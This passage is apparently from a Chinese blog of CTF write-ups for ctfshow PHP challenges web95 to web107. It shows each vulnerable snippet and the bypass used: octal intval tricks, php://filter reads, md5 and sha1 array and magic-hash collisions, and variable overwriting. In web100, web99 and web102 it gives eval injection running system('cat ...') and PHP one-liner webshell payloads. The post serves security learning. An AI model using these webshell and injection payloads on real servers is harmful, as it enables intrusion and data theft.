src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401081134364.png"></p><h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;  $num &#x3D; $_GET[&#39;num&#39;];  if($num&#x3D;&#x3D;4476)&#123;    die(&quot;no no no!&quot;);  &#125;  if(preg_match(&quot;&#x2F;[a-z]|\.&#x2F;i&quot;, $num))&#123;    die(&quot;no no no!!&quot;);  &#125;  if(!strpos($num, &quot;0&quot;))&#123;    die(&quot;no no no!!!&quot;);  &#125;  if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;    echo $flag;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先对本次preg_match进行fuzz测试下</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401081202318.png"></p><p>然后可以本题变化在于第二个if判断又从强等于变回了弱等于，那么php94中的4476.0现在是没法使用了，我们需要考虑的是对八进制的这个值进行改进，最终结果有</p><pre class="line-numbers language-none"><code class="language-none">num&#x3D;%20010574  八进制（%20就是空格）num&#x3D;+010574<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401081203738.png"></p><h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#39;u&#39;]))&#123;  if($_GET[&#39;u&#39;]&#x3D;&#x3D;&#39;flag.php&#39;)&#123;    die(&quot;no no no&quot;);  &#125;else&#123;    highlight_file($_GET[&#39;u&#39;]);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题所要考的是路径问题，highlight_file中均等效于flag.php，我们可以通过三种方法来解决</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php              绝对路径 .&#x2F;flag.php                          相对路径 php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php      php伪协议<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401081211292.png"></p><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) &#123;if ($_POST[&#39;a&#39;] !&#x3D; $_POST[&#39;b&#39;])if (md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;]))echo $flag;elseprint &#39;Wrong.&#39;;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题首先是一个POST传参，然后是md5强等于，可以直接使用数组进行绕过，即post传参<strong>a[]&#x3D;1&amp;b[]&#x3D;2</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191701617.png"></p><h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);$_GET?$_GET&#x3D;&amp;$_POST:&#39;flag&#39;;$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_COOKIE:&#39;flag&#39;;$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_SERVER:&#39;flag&#39;;highlight_file($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;?$flag:__FILE__);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">三目运算符格式(expr1) ? (expr2) : (expr3);类比于if、elseif(expr1)&#123;expr2;&#125;else&#123;expr3;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以我们可以将该代码修改为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);if(isset($_GET))&#123;$_GET&#x3D;&amp;$_POST;&#125;else&#123;&#39;flag&#39;;&#125;if($_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;)&#123;$_GET&#x3D;&amp;$_COOKIE;&#125;else&#123;&#39;flag&#39;;&#125;if($_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;)&#123;$_GET&#x3D;&amp;$_SERVER;&#125;else&#123;&#39;flag&#39;;&#125;if($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;)&#123;$flag;&#125;else&#123;__FILE__;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以只需要我们get和post同时传参HTTP_FLAG&#x3D;flag即可得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191701647.png"></p><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);$allow &#x3D; array();for ($i&#x3D;36; $i &lt; 0x36d; $i++) &#123;   array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#123;  file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先将$allow设置为数组，然后向数组内插入随机数，in_array()函数没有设置第三个参数 就可以形成自动转换eg:n&#x3D;1.php自动转换为1，所以我们可以get设置为一个php文件，然后content中传入一句话木马，那么就会在file_put_contents函数中，将content的所传的参写入n这个文件中</p><p>故可以构造该url</p><blockquote><p>get:  url+&#x2F;?1.php</p><p>post: content&#x3D;&lt;?php @eval($_POST[‘shell’]); ?</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191701431.png"></p><p>通过蚁剑进行连接，得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191701506.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">拓展：有三个不认识的函数，array_push()、in_array()、file_put_contents()array_push() 函数向数组尾部插入一个或多个元素。array_push(array,value1,value2...)参数描述array必需。规定一个数组。value1必需。规定要添加的值。value2可选。规定要添加的值。in_array() 函数搜索数组中是否存在指定的值。bool in_array ( mixed $needle , array $haystack [, bool $strict &#x3D; FALSE ] )参数描述needle必需。规定要在数组搜索的值。haystack必需。规定要搜索的数组。strict可选。如果该参数设置为 TRUE，则 in_array() 函数检查搜索的数据与数组的值的类型是否相同。file_put_contents() 函数把一个字符串写入文件中。int file_put_contents (string $filename , mixed $data [, int $flags &#x3D; 0[, resource $context ]])参数描述filename必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。data必需。规定要写入文件的数据。可以是字符串、数组或数据流。flags可选。规定如何打开&#x2F;写入文件。可能的值：FILE_USE_INCLUDE_PATHFILE_APPENDLOCK_EXcontext可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);&#x2F;&#x2F;flag in class ctfshow;$ctfshow &#x3D; new ctfshow();$v1&#x3D;$_GET[&#39;v1&#39;];$v2&#x3D;$_GET[&#39;v2&#39;];$v3&#x3D;$_GET[&#39;v3&#39;];$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;  if(!preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v2))&#123;    if(preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v3))&#123;      eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);    &#125;  &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为赋值运算的优先级比AND和OR的高，所以先赋值；比&amp;&amp;和||的低，所以逻辑运算符先执行，先逻辑运算，再赋值。</p><pre class="line-numbers language-none"><code class="language-none">例如$p &#x3D; 6 or 0;var_dump($p);&#x2F;&#x2F;int(6)$p &#x3D; 6 || 0;var_dump($p);&#x2F;&#x2F;bool(true)$p &#x3D; 6 and 0;var_dump($p); &#x2F;&#x2F;int(6) $p &#x3D; 6 &amp;&amp; 0;var_dump($p); &#x2F;&#x2F;bool(false) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以我们可以通过给v1赋值从而来控制v0的值，剩下的就可以通过对v2，v3赋值以此来拿到ctfshow.php里的flag</p><p>可以构造</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;?v1&#x3D;1&amp;v2&#x3D;system(&quot;cat ctfshow.php&quot;)&#x2F;*&amp;v3&#x3D;\*&#x2F;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191701844.png"></p><p>打开网页源代码可以找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191701057.png"></p><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);&#x2F;&#x2F;flag in class ctfshow;$ctfshow &#x3D; new ctfshow();$v1&#x3D;$_GET[&#39;v1&#39;];$v2&#x3D;$_GET[&#39;v2&#39;];$v3&#x3D;$_GET[&#39;v3&#39;];$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;  if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\&#x3D;|\&#123;|\[|\&quot;|\&#39;|\,|\.|\;|\?|[0-9]&#x2F;&quot;, $v2))&#123;    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\&#x3D;|\&#123;|\[|\&quot;|\&#39;|\,|\.|\?|[0-9]&#x2F;&quot;, $v3))&#123;      eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);    &#125;  &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与上题差不多，但是过滤了更多的东西</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">v2和v3的值仅能有 &amp;(:&lt;&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZ]abcdefghijklmnopqrstuvwxyz|&#125;!$&#39;()+,.&#x2F;;&#x3D;[]_<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开始我还在想着与php100一样通过命令执行拿到flag，但怎么试都拿不到，后来上网看大佬的wp，发现本题考点是反射类</p><blockquote><p>PHP 的反射API很多，但是常用的一般都是 <code>ReflectionClass</code> 和 <code>ReflectionMethod</code>:<br>1.ReflectionClass，这个是用来获取类的信息                                                                                                        常用方法，详细的可以查看文档：                                                                                                      ReflectionClass::getMethods     获取方法的数组<br>ReflectionClass::getName        获取类名<br>ReflectionClass::hasMethod      检查方法是否已定义<br>ReflectionClass::hasProperty    检查属性是否已定义<br>ReflectionClass::isAbstract     检查类是否是抽象类（abstract）<br>ReflectionClass::isFinal        检查类是否声明为 final<br>ReflectionClass::isInstantiable 检查类是否可实例化<br>ReflectionClass::newInstance    从指定的参数创建一个新的类实例</p><p>2.ReflectionMethod<br>这个主要是针对方法的反射                                                                                                                                                        常用的方法，详细的可以去看看文档：                                                                                          ReflectionMethod::invoke        执行<br>ReflectionMethod::invokeArgs    带参数执行<br>ReflectionMethod::isAbstract    判断方法是否是抽象方法<br>ReflectionMethod::isConstructor 判断方法是否是构造方法<br>ReflectionMethod::isDestructor  判断方法是否是析构方法<br>ReflectionMethod::isFinal       判断方法是否定义 final<br>ReflectionMethod::isPrivate     判断方法是否是私有方法<br>ReflectionMethod::isProtected   判断方法是否是保护方法 (protected)<br>ReflectionMethod::isPublic      判断方法是否是公开方法<br>ReflectionMethod::isStatic      判断方法是否是静态方法<br>ReflectionMethod::setAccessible 设置方法是否访问</p><p>引用<a href="https://learnku.com/articles/7538/the-application-of-reflection-in-php">反射在 PHP 中的应用 | Laravel China 社区 (learnku.com)</a></p></blockquote><p>所以我们可以构造</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;?v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191701414.png"></p><h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);$v1 &#x3D; $_POST[&#39;v1&#39;];$v2 &#x3D; $_GET[&#39;v2&#39;];$v3 &#x3D; $_GET[&#39;v3&#39;];$v4 &#x3D; is_numeric($v2) and is_numeric($v3);if($v4)&#123;  $s &#x3D; substr($v2,2);  $str &#x3D; call_user_func($v1,$s);  echo $str;  file_put_contents($v3,$str);&#125;else&#123;  die(&#39;hacker&#39;);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>file_put_contents()、is_numeric的作用就不做赘述，在上面php99已经涉及到，</p><p>剩下就是substr函数</p><pre class="line-numbers language-none"><code class="language-none">substr() 函数返回字符串的一部分。注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。-----------------------语法---------------------------------substr(string,start,length)参数   描述string必需。规定要返回其中一部分的字符串。start必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾的指定位置开始0 - 在字符串中的第一个字符处开始length可选。规定要返回的字符串长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回负数 - 从字符串末端返回call_user_func()调用回调函数，并把一个数组参数作为回调函数的参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><p>那么可知$s的值就是从$v2传入的参从第二位开始截取。而且仍然考到赋值与and的优先性，所以我们只需要确保$v2可以满足这个is_numeric判断，通过file_put_contents()我们可以确定的是$v3是一个php文件以便一句话木马的写入，那么现在v2的可考虑性就是如何既能满足is_numeric函数又可以变成一句话木马。</p><p>这里需要用到hex2bin函数，也就是为$v1传参hex2bin以此再通过call_user_func()回调。</p><pre class="line-numbers language-none"><code class="language-none">hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。----------------语法-----------------------------------hex2bin(string)参数描述string必需。要转换的十六进制值。技术细节返回值：返回转换字符串的 ASCII 字符，如果失败则返回 FALSE。PHP 版本：5.4.0+更新日志：自 PHP 5.4.1 起，如果字符串长度为奇数，则抛出一个警告。在 PHP 5.4.0 中，奇数字符串被默默接受，但是最后一个字节会被移除。自 PHP 5.5.1 起，如果字符串是无效的十六进制字符串，则抛出一个警告。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>is_numeric()判断十六进制即0x开头，在php5时返回True，在php7返回False</p></blockquote><p>而之后经过substr截断后，$str就是一个没有0x开头的16进制数，再通过call_user_func回调hex2bin函数将该16进制转换为ASCII字符，就可以得到一个一句话木马（注：hex2bin无法转换带0x的16进制数）</p><p>所以我们可以如此构造 </p><blockquote><p>GET: v2&#x3D;0x3c3f70687020406576616c28245f504f53545b2731275d293b3f3e&amp;v3&#x3D;1.php</p><?php @eval($_POST['1']);?><p>POST: v1&#x3D;hex2bin</p></blockquote><p>但是可惜的是，这题是php7，所以那个if判断我们没法绕过去，所以只能用另一种方式来达到目的。</p><h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><p>那么我们现在要考虑的就是如何在php7中使得$v2传入的参既能满足is_numeric函数，又能被当成一句话木马被写入呢，这里需要用到base64_encode以及php伪协议来满足</p><pre class="line-numbers language-none"><code class="language-none">$a&#x3D;&quot;xxx&quot;;$b&#x3D;base64_encode($a);$c&#x3D;bin2hex($b);只要满足$c纯数字即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最后我们传入$c的值满足is_numeric函数，然后再通过call_user_func函数回调hex2bin()将其转换为base64编码，再通过利用php伪协议读取的$v3文件以此来解码这个base64编码并利用file_put_contents写入。</p><p>这里直接用大佬所找到的$a</p><blockquote><p>即$a为’&lt;?&#x3D;`cat *&#96;;’;</p><p>通过base64_encode编码后为PD89YGNhdCAqYDs，再通过bin2hex后转换为5044383959474e6864434171594473(仅有1个e可以表明其为科学计数法，从而可以绕过is_numeric函数)</p></blockquote><p>最后构造</p><blockquote><p>GET: v2&#x3D;125044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php</p><p>（因为有substr函数会截断前俩个，所以为确保代码完整性，我们在这之前随便加俩个数字）</p><p>POST: v1&#x3D;hex2bin</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191700415.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191700410.png"></p><h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);$v1 &#x3D; $_POST[&#39;v1&#39;];$v2 &#x3D; $_GET[&#39;v2&#39;];$v3 &#x3D; $_GET[&#39;v3&#39;];$v4 &#x3D; is_numeric($v2) and is_numeric($v3);if($v4)&#123;  $s &#x3D; substr($v2,2);  $str &#x3D; call_user_func($v1,$s);  echo $str;  if(!preg_match(&quot;&#x2F;.*p.*h.*p.*&#x2F;i&quot;,$str))&#123;    file_put_contents($v3,$str);  &#125;  else&#123;    die(&#39;Sorry&#39;);  &#125;&#125;else&#123;  die(&#39;hacker&#39;);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与php102相同，不过添加了一个对$str的过滤条件，确保其内没有php标签，这样的正则表达式会匹配包含 “php”、”pahp”、”paahp” 等的字符串。</p><p>但是根据php102，echo出的$str为PD89YGNhdCAqYDs，里面并没有。所以可以和php102构造一模一样的参</p><blockquote><p>GET: v2&#x3D;125044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php</p><p>（因为有substr函数会截断前俩个，所以为确保代码完整性，我们在这之前随便加俩个数字）</p><p>POST: v1&#x3D;hex2bin</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191700510.png"></p><h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phphighlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;  $v1 &#x3D; $_POST[&#39;v1&#39;];  $v2 &#x3D; $_GET[&#39;v2&#39;];  if(sha1($v1)&#x3D;&#x3D;sha1($v2))&#123;    echo $flag;  &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SHA1弱等于，可以采取数组绕过，不过要注意v1和v2的传参方式，可构造</p><pre class="line-numbers language-none"><code class="language-none">GET：v2[]&#x3D;1POST：v1[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191700410.png"></p><p>或者构造</p><pre class="line-numbers language-none"><code class="language-none">GET：v2&#x3D;10932435112POST：v1&#x3D;aaroZmOk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191700264.png"></p><blockquote><p>参考</p><p>md5：</p><p>240610708:0e462097431906509019562988736854<br>QLTHNDT:0e405967825401955372549139051580<br>QNKCDZO:0e830400451993494058024219903391<br>PJNPDWY:0e291529052894702774557631701704<br>NWWKITQ:0e763082070976038347657360817689<br>NOOPCJF:0e818888003657176127862245791911<br>MMHUWUV:0e701732711630150438129209816536<br>MAUXXQC:0e478478466848439040434801845361</p><p>sha1：</p><p>10932435112: 0e07766915004133176347055865026311692244<br>aaroZmOk: 0e66507019969427134894567494305185566735<br>aaK1STfY: 0e76658526655756207688271159624026011393<br>aaO8zKZF: 0e89257456677279068558073954252716165668<br>aa3OFF9m: 0e36977786278517984959260394024281014729<br>0e1290633704: 0e19985187802402577070739524195726831799</p></blockquote><p>大佬链接——&gt;<a href="https://blog.csdn.net/cosmoslin/article/details/120973888">PHP—MD5和sha1绕过_php字符串弱不等,sha1强相等-CSDN博客</a></p><h3 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);include(&#39;flag.php&#39;);error_reporting(0);$error&#x3D;&#39;你还想要flag嘛？&#39;;$suces&#x3D;&#39;既然你想要那给你吧！&#39;;foreach($_GET as $key &#x3D;&gt; $value)&#123;  if($key&#x3D;&#x3D;&#x3D;&#39;error&#39;)&#123;    die(&quot;what are you doing?!&quot;);  &#125;  $$key&#x3D;$$value;&#125;foreach($_POST as $key &#x3D;&gt; $value)&#123;  if($value&#x3D;&#x3D;&#x3D;&#39;flag&#39;)&#123;    die(&quot;what are you doing?!&quot;);  &#125;  $$key&#x3D;$$value;&#125;if(!($_POST[&#39;flag&#39;]&#x3D;&#x3D;$flag))&#123;  die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\n&quot;;die($suces);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题考查的为php变量覆盖，题目共有三个变量$error、$suces、$flag</p><p>让key&#x3D;suces, 那么可知key&#x3D;suces，然后如果value&#x3D;flag，那么可知value&#x3D;flag，此时变量覆盖，suces&#x3D;flag</p><p>可以通过俩个die函数获得flag</p><h4 id="第一个-die-error"><a href="#第一个-die-error" class="headerlink" title="第一个  die($error)"></a>第一个  die($error)</h4><p>通过构造</p><blockquote><p>GET: abc&#x3D;flag                                                                                                                                                              POST: error&#x3D;abc</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191700040.png"></p><p>传入后$key存储abc,$value存储flag，此时$abc&#x3D;$flag，然后再第二个foreach循环中，$key&#x3D;error，$value&#x3D;abc,那么他下面$value的强等于就没有触发，而是变量覆盖，$error&#x3D;$abc。此时由于$abc为$flag，$error&#x3D;$abc，那么就是$error&#x3D;$abc，即$error&#x3D;$flag。由于 POST 请求中没有名为 <code>flag</code> 的参数，所以 <code>$flag</code> 这个变量的值将保持不变。因此，当执行 <strong>if(!($_POST[‘flag’]&#x3D;&#x3D;$flag)){ die($error); }</strong> 这一行代码时，它实际上是在检查 POST 请求中是否存在 <code>flag</code> 参数，但是由于不存在，所以条件始终为真。因此，触发die函数，也就是触发die($flag)，得到flag的值</p><h4 id="第二个-die-suces"><a href="#第二个-die-suces" class="headerlink" title="第二个   die($suces)"></a>第二个   die($suces)</h4><p>通过构造</p><blockquote><p>GET: suces&#x3D;flag                                                                                                                                                            POST: flag&#x3D;</p></blockquote><p>同理传入后$key&#x3D;$suces，$value&#x3D;$flag，此时$suces&#x3D;$flag。然后第二个foreach循环中，$key&#x3D;$flag，$value&#x3D;NULL，即$flag&#x3D;NULL，满足**($_POST[‘flag’]&#x3D;&#x3D;$flag)**，即检查到了$flag参数，那么就跳过该if判断，得到$flag的值，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191655123.png"></p><h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;  $v1 &#x3D; $_POST[&#39;v1&#39;];  $v2 &#x3D; $_GET[&#39;v2&#39;];  if(sha1($v1)&#x3D;&#x3D;sha1($v2) &amp;&amp; $v1!&#x3D;$v2)&#123;    echo $flag;  &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟php104差不多，唯一区别就是多了个$v1!&#x3D;$v2,但是在$104的俩种解法仍可以使用。</p><h4 id="第一种-数组绕过"><a href="#第一种-数组绕过" class="headerlink" title="第一种  数组绕过"></a>第一种  数组绕过</h4><pre class="line-numbers language-none"><code class="language-none">可构造GET：v2[]&#x3D;1POST：v1[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191700744.png"></p><h4 id="第二种-sha1弱等于"><a href="#第二种-sha1弱等于" class="headerlink" title="第二种 sha1弱等于"></a>第二种 sha1弱等于</h4><pre class="line-numbers language-none"><code class="language-none">可构造GET：v2&#x3D;10932435112POST：v1&#x3D;aaroZmOk其他供选择的值sha1：10932435112: 0e07766915004133176347055865026311692244aaroZmOk: 0e66507019969427134894567494305185566735aaK1STfY: 0e76658526655756207688271159624026011393aaO8zKZF: 0e89257456677279068558073954252716165668aa3OFF9m: 0e369777862785179849592603940242810147290e1290633704: 0e19985187802402577070739524195726831799<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191703948.png"></p><h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if(isset($_POST[&#39;v1&#39;]))&#123;  $v1 &#x3D; $_POST[&#39;v1&#39;];  $v3 &#x3D; $_GET[&#39;v3&#39;];    parse_str($v1,$v2);    if($v2[&#39;flag&#39;]&#x3D;&#x3D;md5($v3))&#123;      echo $flag;    &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>涉及到一个函数parse_str() </p><pre class="line-numbers language-none"><code class="language-none">parse_str() 函数把查询字符串解析到变量中。注释：如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。注释：php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。-------------------------------语法------------------------------parse_str(string,array)参数描述string必需。规定要解析的字符串。array可选。规定存储变量的数组名称。该参数指示变量存储到数组中。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即使用 <strong>parse_str</strong> 函数将 <code>$v1</code> 解析成一个关联数组，并将结果存储在 <code>$v2</code> 中。</p><p>所以我们可以构造</p><pre 